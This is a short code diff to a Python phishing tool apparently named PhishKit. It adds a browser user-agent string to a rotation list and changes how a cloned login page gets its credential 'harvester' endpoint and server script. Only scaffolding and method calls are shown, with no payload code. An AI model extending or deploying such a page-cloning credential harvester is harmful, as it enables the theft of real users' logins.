@@ -60,7 +60,8 @@ def print_title():
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
 ]
 
 class PhishKit:
@@ -122,11 +123,8 @@ class PhishKit:
             with open(index_path, 'w', encoding='utf-8') as f:
                 f.write(html)
             
-            # Create harvester endpoint
+            # Create harvester server script
             self._create_harvester_endpoint()
-            
-            # Create server script
-            self._create_server_script()
             
             print(f"{Fore.GREEN}[+] Page cloned successfully{Style.RESET_ALL}")
             print(f"{Fore.GREEN}[+] Output: {os.path.abspath(self.output_dir)}{Style.RESET_ALL}")
